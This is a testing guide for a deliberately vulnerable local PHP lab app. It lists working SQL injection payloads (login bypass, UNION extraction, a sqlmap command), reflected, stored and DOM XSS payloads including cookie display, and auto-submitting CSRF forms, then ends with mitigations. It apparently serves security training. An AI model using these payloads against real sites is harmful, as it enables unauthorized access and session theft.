# Vulnerability Testing Guide - SQLMAP_Lab

This guide provides instructions and payloads for testing common web vulnerabilities found in this lab environment.

---

## 1. SQL Injection (SQLi)
The application fails to sanitize inputs in several places, allowing you to manipulate the underlying database.

### A. Authentication Bypass
*   **Target:** `login.php`
*   **Payload (Username field):** `admin' OR '1'='1`
*   **How it works:** This changes the SQL query to `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`, which is always true, logging you in as the first user (admin).

### B. Data Extraction (UNION-Based)
*   **Target:** `index.php?search=`
*   **Payload:** `' UNION SELECT 1, DATABASE(), USER(), VERSION(), 5 -- `
*   **Result:** The database name, current user, and version will appear in the blog post results.

### C. Automated Tool (sqlmap)
*   **Command:** `sqlmap -u "http://localhost/SQLMAP_Lab/index.php?search=test" --dbs`
*   **Next Step:** Once you have the database name, use `--tables` to see the tables.

---

## 2. Cross-Site Scripting (XSS)
The application reflects user input directly onto the page without encoding, allowing JavaScript execution.

### A. Reflected XSS
*   **Target:** `login.php?msg=`
*   **Payload:** `http://localhost/SQLMAP_Lab/login.php?msg=<script>alert('Reflected XSS')</script>&type=error`

### B. Stored XSS
*   **Target:** `create.php` (Submit a new post)
*   **Payload (Title or Content):** `<script>alert(document.cookie)</script>`
*   **Result:** Every user who visits the homepage will now see an alert box with their session cookie.

### C. DOM-Based XSS
*   **Target:** `index.php` (Using the URL Fragment)
*   **Payload:** `http://localhost/SQLMAP_Lab/index.php#<img src=x onerror=alert('DOM_XSS')>`
*   **How it works:** The JavaScript in `index.php` reads from `window.location.hash` and writes directly to `innerHTML`.

---

## 3. Cross-Site Request Forgery (CSRF)
The application lacks CSRF tokens on sensitive actions like creating or deleting posts.

### A. Forced Post Deletion
*   **Target:** `delete.php?id=[POST_ID]`
*   **Scenario:** If an admin is logged in and visits a malicious website, that website can trigger a deletion.
*   **Payload (HTML on a malicious site):**
    ```html
    <img src="http://localhost/SQLMAP_Lab/delete.php?id=1" style="display:none;">
    ```

### B. Forced Post Creation
*   **Target:** `create.php`
*   **Scenario:** An attacker can host a hidden form that auto-submits when a logged-in user visits their page.
*   **Payload (attacker.html):**
    ```html
    <form id="csrf-form" action="http://localhost/SQLMAP_Lab/create.php" method="POST">
        <input type="hidden" name="title" value="Hacked!">
        <input type="hidden" name="content" value="This post was created via CSRF.">
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
    ```

---

## 4. Mitigation Best Practices
To fix these, the lab would need:
1.  **Prepared Statements** for all SQL queries.
2.  **HTML Entity Encoding** (e.g., `htmlspecialchars()`) for all outputs.
3.  **CSRF Tokens** for every state-changing request (POST/GET/DELETE).
